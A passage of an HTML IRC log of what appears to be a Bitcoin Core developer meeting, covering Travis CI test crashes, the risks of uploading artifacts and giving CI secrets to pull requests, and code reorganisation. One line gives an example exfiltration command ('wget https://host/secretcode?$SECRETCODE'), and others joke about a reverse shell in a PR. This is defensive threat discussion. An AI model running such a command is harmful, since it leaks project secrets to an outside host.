+<a name="l-185"></a><span class="tm">19:37:54</span><span class="nk"> &lt;jonasschnelli&gt;</span> Could it be related to the boost test framework?
+<a name="l-186"></a><span class="tm">19:37:55</span><span class="nk"> &lt;BlueMatt&gt;</span> eg if it crashes coredump and gdb print all backtraces
+<a name="l-187"></a><span class="tm">19:38:10</span><span class="nk"> &lt;wumpus&gt;</span> but yes, getting a core file would be useful
+<a name="l-188"></a><span class="tm">19:38:14</span><span class="nk"> &lt;jeremyrubin&gt;</span> boost test runner can start gdb. I wonder if it reads .gdbinit
+<a name="l-189"></a><span class="tm">19:38:15</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">BlueMatt:</span> thats probably the right way to go there.
+<a name="l-190"></a><span class="tm">19:38:25</span><span class="nk"> &lt;wumpus&gt;</span> although you need the executable too, to debug it
+<a name="l-191"></a><span class="tm">19:38:28</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jeremyrubin:</span> yes, but if it crashes its probably not in a good state to do so. :P
+<a name="l-192"></a><span class="tm">19:38:32</span><span class="nk"> &lt;wumpus&gt;</span> and uploading from travis :(
+<a name="l-193"></a><span class="tm">19:38:40</span><span class="nk"> &lt;BlueMatt&gt;</span> <span class="hi">wumpus:</span> i mean we can at least print stack traces
+<a name="l-194"></a><span class="tm">19:38:47</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">wumpus:</span> just detect the crash in the script and run gdb.
+<a name="l-195"></a><span class="tm">19:38:53</span><span class="nk"> &lt;gmaxwell&gt;</span> and print the backtraces.
+<a name="l-196"></a><span class="tm">19:39:05</span><span class="nk"> &lt;wumpus&gt;</span> ok, yes, backtrace would help
+<a name="l-197"></a><span class="tm">19:40:02</span><span class="nk"> &lt;gmaxwell&gt;</span> do we know when the first of these errors was?
+<a name="l-198"></a><span class="tm">19:40:07</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jtimon:</span> yes, it sounds ilke a global initialisation order fiasco
+<a name="l-199"></a><span class="tm">19:40:28</span><span class="nk"> &lt;jeremyrubin&gt;</span> could be nice to detect the failing case, and then re-run it under say, valgrind
+<a name="l-200"></a><span class="tm">19:40:47</span><span class="nk"> &lt;wumpus&gt;</span> no, I don't know. I started getting annoyed by them today, but it's been going on yesterday at least as well
+<a name="l-201"></a><span class="tm">19:41:39</span><span class="nk"> &lt;wumpus&gt;</span> bisecting this with travis would take *a lot* of patience
+<a name="l-202"></a><span class="tm">19:41:53</span><span class="nk"> &lt;gmaxwell&gt;</span> that kind of suggests that it's a change on travis' end, no? we haven't had any changes on 0.14 in the past two days that could have caused this?
+<a name="l-203"></a><span class="tm">19:42:06</span><span class="nk"> &lt;wumpus&gt;</span> I don't think so either.
+<a name="l-204"></a><span class="tm">19:42:16</span><span class="nk"> &lt;wumpus&gt;</span> the big locking changes are longer ago
+<a name="l-205"></a><span class="tm">19:42:27</span><span class="nk"> &lt;wumpus&gt;</span> and it didn't start after that
+<a name="l-206"></a><span class="tm">19:42:50</span><span class="nk"> &lt;jeremyrubin&gt;</span> topic suggest -- code reorganizing (renaming rpc tests, etc)
+<a name="l-207"></a><span class="tm">19:43:05</span><span class="nk"> &lt;gmaxwell&gt;</span> does something in the travis log report what hardware it ran on?
+<a name="l-208"></a><span class="tm">19:43:06</span><span class="nk"> &lt;wumpus&gt;</span> still, the question is whether it is a change at travis's end that exposes something in our code
+<a name="l-209"></a><span class="tm">19:43:15</span><span class="nk"> &lt;gmaxwell&gt;</span> e.g. so we could correlate failures with a specific host?
+<a name="l-210"></a><span class="tm">19:43:22</span><span class="nk"> &lt;wumpus&gt;</span> or something that is completely broken on their end
+<a name="l-211"></a><span class="tm">19:43:30</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">gmaxwell:</span> I'm afraid not. Wasn't able to find it
+<a name="l-212"></a><span class="tm">19:43:49</span><span class="nk"> &lt;wumpus&gt;</span> I don't think they give access to that information
+<a name="l-213"></a><span class="tm">19:43:59</span><span class="nk"> &lt;jnewbery&gt;</span> <span class="hi">wumpus:</span> why is uploading from travis :( ? is it something you've tried before?
+<a name="l-214"></a><span class="tm">19:44:14</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jnewbery:</span> it's a pit of snakes, security-wise
+<a name="l-215"></a><span class="tm">19:44:21</span><span class="nk"> &lt;ryanofsky&gt;</span> this is older than 2 days, i first noticed these last friday on 9773: https://github.com/bitcoin/bitcoin/pull/9773#issuecomment-280684263
+<a name="l-216"></a><span class="tm">19:44:40</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jnewbery:</span> we could temporary have it submit files somewhere to debug an issue, I guess
+<a name="l-217"></a><span class="tm">19:45:24</span><span class="nk"> &lt;jnewbery&gt;</span> It can be configured it to upload artifacts to S3: https://docs.travis-ci.com/user/uploading-artifacts/
+<a name="l-218"></a><span class="tm">19:45:30</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jeremyrubin:</span> the issue there is just in terms of provisioning travis with secrets.
+<a name="l-219"></a><span class="tm">19:45:37</span><span class="nk"> &lt;kanzure&gt;</span> no private environment variables?
+<a name="l-220"></a><span class="tm">19:45:40</span><span class="nk"> &lt;gmaxwell&gt;</span> er darnit, too many js in here.
+<a name="l-221"></a><span class="tm">19:45:54</span><span class="nk"> &lt;wumpus&gt;</span> private environment variables don't work for pull requests, the test script could be replaced with anything
+<a name="l-222"></a><span class="tm">19:45:57</span><span class="nk"> &lt;jeremyrubin&gt;</span> <span class="hi">gmaxwell:</span> i was wat-ing :)
+<a name="l-223"></a><span class="tm">19:46:06</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">kanzure:</span> PR's can steal them.
+<a name="l-224"></a><span class="tm">19:46:07</span><span class="nk"> &lt;jeremyrubin&gt;</span> Can you get a shell to travis
+<a name="l-225"></a><span class="tm">19:46:20</span><span class="nk"> &lt;wumpus&gt;</span> including echo $SECRET_CODE or wget https://host/secretcode?$SECRETCODE
+<a name="l-226"></a><span class="tm">19:46:22</span><span class="nk"> &lt;kanzure&gt;</span> cool. hm.
+<a name="l-227"></a><span class="tm">19:46:30</span><span class="nk"> &lt;jeremyrubin&gt;</span> (probably against TOS)
+<a name="l-228"></a><span class="tm">19:46:51</span><span class="nk"> &lt;MarcoFalke&gt;</span> I think you can specify secrets that are valid on branches only, but I might be wrong
+<a name="l-229"></a><span class="tm">19:46:56</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jeremyrubin:</span> A assume just open a PR that connects back to you. :P
+<a name="l-230"></a><span class="tm">19:47:08</span><span class="nk"> &lt;wumpus&gt;</span> lol a reverse shell in a PR
+<a name="l-231"></a><span class="tm">19:47:13</span><span class="nk"> &lt;BlueMatt&gt;</span> I assume you can, but, yea ToS (not to mention monopolizing their service....)
+<a name="l-232"></a><span class="tm">19:47:32</span><span class="nk"> &lt;gmaxwell&gt;</span> wait, you're all not mining bitcoins there already?
+<a name="l-233"></a><span class="tm">19:47:41</span><span class="nk"> &lt;jeremyrubin&gt;</span> I heard someone did that recently right?
+<a name="l-234"></a><span class="tm">19:48:10</span><span class="nk"> &lt;gmaxwell&gt;</span> in any case, we've wasted most of a perfectly good hour on this. :P
+<a name="l-235"></a><span class="tm">19:48:18</span><span class="nk"> &lt;wumpus&gt;</span> I like the idea of uploading the executable and core files more. They could be pushed to a private server, no need to openly host them, that meanst here's less reason for people up to no good to inject anything
+<a name="l-236"></a><span class="tm">19:48:56</span><span class="nk"> &lt;wumpus&gt;</span> the biggest security worry was with hosting the built binaries
+<a name="l-237"></a><span class="tm">19:49:07</span><span class="nk"> &lt;jtimon&gt;</span> topic code reorganizing?
+<a name="l-238"></a><span class="tm">19:49:13</span><span class="nk"> &lt;wumpus&gt;</span> bleh
+<a name="l-239"></a><span class="tm">19:49:15</span><span class="nk"> &lt;wumpus&gt;</span> okay :p
+<a name="l-240"></a><span class="tm">19:49:23</span><span class="nk"> &lt;wumpus&gt;</span> <span class="topic">#topic </span><span class="topicline">code reorganizing</span>
+<a name="l-241"></a><span class="tm">19:49:25</span><span class="nk"> &lt;jnewbery&gt;</span> suggested (marginally related) topic: code coverage and benchmark tracking
+<a name="l-242"></a><span class="tm">19:49:27</span><span class="nk"> &lt;gmaxwell&gt;</span> we should ask travis for a feature that sets an enviroment variable to H(project secret || commit hash) ... and then we could have something whitelist uploads from specific PRs (e.g. by known people)
+<a name="l-243"></a><span class="tm">19:49:36</span><span class="nk"> &lt;jtimon&gt;</span> it's 10 mins, so no time for a big topic I think
+<a name="l-244"></a><span class="tm">19:50:04</span><span class="nk"> &lt;jeremyrubin&gt;</span> I have a POC branch which moves most of the pure data structures  to a datastructures dir.
+<a name="l-245"></a><span class="tm">19:50:06</span><span class="nk"> &lt;gmaxwell&gt;</span> Rename rpctests to tests rename test_bitcoin to useless_thing_that_crashes_in_travis. Done.
+<a name="l-246"></a><span class="tm">19:50:36</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">gmaxwell:</span> yep
+<a name="l-247"></a><span class="tm">19:50:39</span><span class="nk"> &lt;jtimon&gt;</span> <span class="hi">jeremyrubin:</span> you mean including things like CTransaction and CBlockHeader?
+<a name="l-248"></a><span class="tm">19:50:41</span><span class="nk"> &lt;luke-jr&gt;</span> <span class="hi">jeremyrubin:</span> that doesn't sound like the right direction
+<a name="l-249"></a><span class="tm">19:50:43</span><span class="nk"> &lt;jeremyrubin&gt;</span> no
+<a name="l-250"></a><span class="tm">19:50:49</span><span class="nk"> &lt;jeremyrubin&gt;</span> non-bitcoin specific ones
+<a name="l-251"></a><span class="tm">19:50:51</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jeremyrubin:</span> really? datastructures?  shall we have a file called functions.cpp and a file called variables.cpp too? :P
+<a name="l-252"></a><span class="tm">19:50:57</span><span class="nk"> &lt;jeremyrubin&gt;</span> E.g., prevector
+<a name="l-253"></a><span class="tm">19:50:58</span><span class="nk"> &lt;luke-jr&gt;</span> XD
+<a name="l-254"></a><span class="tm">19:51:07</span><span class="nk"> &lt;luke-jr&gt;</span> <span class="hi">jeremyrubin:</span> oh, okay, that sounds less bad
+<a name="l-255"></a><span class="tm">19:51:08</span><span class="nk"> &lt;gmaxwell&gt;</span> oh you mean things like effective language extensions.
+<a name="l-256"></a><span class="tm">19:51:12</span><span class="nk"> &lt;jtimon&gt;</span> I would prefer to move prevector to the consensus dir
+<a name="l-257"></a><span class="tm">19:51:28</span><span class="nk"> &lt;wumpus&gt;</span> yea, prevector is consensus critical
+<a name="l-258"></a><span class="tm">19:51:32</span><span class="nk"> &lt;gmaxwell&gt;</span> suggests that the name still isn't good in that luke and I misunderstood it immediately. :P
+<a name="l-259"></a><span class="tm">19:51:41</span><span class="nk"> &lt;jeremyrubin&gt;</span> so is secp256k1 ;)
+<a name="l-260"></a><span class="tm">19:51:50</span><span class="nk"> &lt;sipa&gt;</span> so is libc
+<a name="l-261"></a><span class="tm">19:51:52</span><span class="nk"> &lt;jtimon&gt;</span> like in https://github.com/bitcoin/bitcoin/pull/8328
+<a name="l-262"></a><span class="tm">19:51:58</span><span class="nk"> &lt;wumpus&gt;</span> yes, we're not renaming secp256k1 are we
+<a name="l-263"></a><span class="tm">19:52:00</span><span class="nk"> &lt;luke-jr&gt;</span> move prevector to boost
+<a name="l-264"></a><span class="tm">19:52:01 </span><span class="nka">* luke-jr</span> <span class="ac">hides</span>
+<a name="l-265"></a><span class="tm">19:52:02</span><span class="nk"> &lt;gmaxwell&gt;</span> Okay, so step one we move libc under consensus/ ...
+<a name="l-266"></a><span class="tm">19:52:32</span><span class="nk"> &lt;jeremyrubin&gt;</span> Anyways, I think it would be nice to move things like that, which could later be made upstream repos
+<a name="l-267"></a><span class="tm">19:52:38</span><span class="nk"> &lt;wumpus&gt;</span> I don't think this is going anywhere, everyone has a different opinoin on what file to put where
+<a name="l-268"></a><span class="tm">19:52:47</span><span class="nk"> &lt;gmaxwell&gt;</span> lpad.js.
+<a name="l-269"></a><span class="tm">19:53:11</span><span class="nk"> &lt;luke-jr&gt;</span> Does prevector have any usage outside consensus?
+<a name="l-270"></a><span class="tm">19:53:19</span><span class="nk"> &lt;jeremyrubin&gt;</span> I think the reason I'd want that is it makes it easier to have more exhaustive testing and also allows other users to more easily use such datastructures
+<a name="l-271"></a><span class="tm">19:53:29</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">luke-jr:</span> it probably should :)
+<a name="l-272"></a><span class="tm">19:53:40</span><span class="nk"> &lt;wumpus&gt;</span> do we have any unique data structures that anyone else inthe world would want to use?
+<a name="l-273"></a><span class="tm">19:53:41</span><span class="nk"> &lt;jtimon&gt;</span> <span class="hi">jeremyrubin:</span> yeah I would like libconsensus to be an "upstream repo" like libsecp256k1, but we would need to complete it first
+<a name="l-274"></a><span class="tm">19:53:55</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jeremyrubin:</span> I don't think any of us care to maintain things like prevector for other usage. Making a good library takes a tremendous amount of work.
+<a name="l-275"></a><span class="tm">19:54:00</span><span class="nk"> &lt;wumpus&gt;</span> I don't think a bitcoin-datastructures library makes sense
+<a name="l-276"></a><span class="tm">19:54:01</span><span class="nk"> &lt;wumpus&gt;</span> right
+<a name="l-277"></a><span class="tm">19:54:17</span><span class="nk"> &lt;wumpus&gt;</span> if we offer a library it should be something useful to bitcoin users
+<a name="l-278"></a><span class="tm">19:54:39</span><span class="nk"> &lt;gmaxwell&gt;</span> Obviously if the author of something like that wants to create a library for other usage, thats fine! but not a project priority.
+<a name="l-279"></a><span class="tm">19:54:40</span><span class="nk"> &lt;wumpus&gt;</span> like a wallet library, or extend libconsensus, ...
+<a name="l-280"></a><span class="tm">19:55:15</span><span class="nk"> &lt;wumpus&gt;</span> sure, you can do whatever you want with the files in the repository, if you need it in your project you can make a library out of it for your own use, or just copy the file, etc
+<a name="l-281"></a><span class="tm">19:55:18</span><span class="nk"> &lt;gmaxwell&gt;</span> from a code org perspective I don't see a problem with moving things like prevector, limitedmap into a utility function directory.. With just the understanding that many of those are used in consensus code too.
+<a name="l-282"></a><span class="tm">19:55:32</span><span class="nk"> &lt;wumpus&gt;</span> not everything needs to be maintained as a library
+<a name="l-283"></a><span class="tm">19:55:32</span><span class="nk"> &lt;jtimon&gt;</span> but since each dev seems to have a different idea of what a "complete libconsensus" should look like...
+<a name="l-284"></a><span class="tm">19:56:04</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">gmaxwell:</span> me neither
+<a name="l-285"></a><span class="tm">19:56:07</span><span class="nk"> &lt;kallewoof&gt;</span> Compartmentalizing bitcoin into separate modules seemed like a plan but maybe not shared by everyone. If it is a shared plan restructuring file places seems important.
+<a name="l-286"></a><span class="tm">19:56:08</span><span class="nk"> &lt;luke-jr&gt;</span> I don't mind it, but IMO more important to work toward more useful library splitting
+<a name="l-287"></a><span class="tm">19:56:14</span><span class="nk"> &lt;sipa&gt;</span> <span class="hi">gmaxwell:</span> agree, some things are generic enough that they can be seen as extensions of the standard libraries
+<a name="l-288"></a><span class="tm">19:56:42</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">sipa:</span> e.g. someday libstdc++ could get something that generalizes prevector, if it did, we'd drop prevector and use that.
+<a name="l-289"></a><span class="tm">19:56:59</span><span class="nk"> &lt;sipa&gt;</span> c++23
+<a name="l-290"></a><span class="tm">19:57:03</span><span class="nk"> &lt;jonasschnelli&gt;</span> heh
+<a name="l-291"></a><span class="tm">19:57:04</span><span class="nk"> &lt;gmaxwell&gt;</span> (well STL technically, I guess, point remains)
+<a name="l-292"></a><span class="tm">19:57:32</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">sipa:</span> C++23 will just integrate libconsensus of course.  template cryprocurrency.
+<a name="l-293"></a><span class="tm">19:57:39</span><span class="nk"> &lt;wumpus&gt;</span> hehe
+<a name="l-294"></a><span class="tm">19:57:42</span><span class="nk"> &lt;jeremyrubin&gt;</span> Well that's my point kinda
+<a name="l-295"></a><span class="tm">19:57:52</span><span class="nk"> &lt;jnewbery&gt;</span> suggested topic: code coverage and benchmark tracking
+<a name="l-296"></a><span class="tm">19:57:59</span><span class="nk"> &lt;jeremyrubin&gt;</span> the consensus things that aren't overly bitcoin-specific
+<a name="l-297"></a><span class="tm">19:57:59</span><span class="nk"> &lt;gmaxwell&gt;</span> Except I was making it as a joke. :P
+<a name="l-298"></a><span class="tm">19:58:01</span><span class="nk"> &lt;wumpus&gt;</span> <span class="hi">jnewbery:</span> next week
+<a name="l-299"></a><span class="tm">19:58:11</span><span class="nk"> &lt;jeremyrubin&gt;</span> Facebook's folly lib is kinda like that
+<a name="l-300"></a><span class="tm">19:58:13</span><span class="nk"> &lt;wumpus&gt;</span> the meeting is about to close
+<a name="l-301"></a><span class="tm">19:58:22</span><span class="nk"> &lt;sipa&gt;</span> anyone have any last words?
+<a name="l-302"></a><span class="tm">19:58:27</span><span class="nk"> &lt;gmaxwell&gt;</span> <span class="hi">jnewbery:</span> we can talk about about it after the meeting and discuss further next week. :)
+<a name="l-303"></a><span class="tm">19:58:44</span><span class="nk"> &lt;jnewbery&gt;</span> <span class="hi">gmaxwell:</span> sounds good
+<a name="l-304"></a><span class="tm">19:58:51</span><span class="nk"> &lt;wumpus&gt;</span> <span class="cmd">#endmeeting</span><span class="cmdline"></span></pre>
+</body></html>
